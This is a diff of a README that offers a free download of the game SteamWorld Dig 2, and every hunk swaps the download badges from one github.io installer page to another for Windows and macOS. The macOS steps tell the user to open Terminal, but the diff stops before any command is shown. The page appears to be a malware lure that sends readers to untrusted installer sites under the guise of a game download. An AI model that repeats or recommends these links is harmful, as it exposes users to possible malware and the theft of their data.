@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Download SteamWorld Dig 2](https://img.shields.io/badge/⬇_Download_SteamWorld%20Dig%202-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![⬇ Download SteamWorld Dig 2](https://img.shields.io/badge/⬇_Download_SteamWorld%20Dig%202-E63946?style=for-the-badge&logo=github)](https://packgiverchopper3.github.io/winsetup/)
 
 </div>
 
@@ -65,9 +65,9 @@ SteamWorld Dig 2 is a charming action-platformer where steam-powered robot Dorot
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://packgiverchopper3.github.io/winsetup/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://packgiverchopper3.github.io/macsetup/)
 
 </div>
 
@@ -85,7 +85,7 @@ SteamWorld Dig 2 is a charming action-platformer where steam-powered robot Dorot
 
 <div align="center">
 
-[![⬇ Download SteamWorld Dig 2](https://img.shields.io/badge/⬇_Download_SteamWorld%20Dig%202-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![⬇ Download SteamWorld Dig 2](https://img.shields.io/badge/⬇_Download_SteamWorld%20Dig%202-E63946?style=for-the-badge&logo=github)](https://packgiverchopper3.github.io/winsetup/)
 
 </div>
 
@@ -117,7 +117,7 @@ SteamWorld Dig 2 is a charming action-platformer where steam-powered robot Dorot
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://packgiverchopper3.github.io/macsetup/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -142,7 +142,7 @@ SteamWorld Dig 2 is a charming action-platformer where steam-powered robot Dorot
 
 <div align="center">
 
-[![⬇ Download SteamWorld Dig 2](https://img.shields.io/badge/⬇_Download_SteamWorld%20Dig%202-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![⬇ Download SteamWorld Dig 2](https://img.shields.io/badge/⬇_Download_SteamWorld%20Dig%202-E63946?style=for-the-badge&logo=github)](https://packgiverchopper3.github.io/winsetup/)
 
 </div>
 
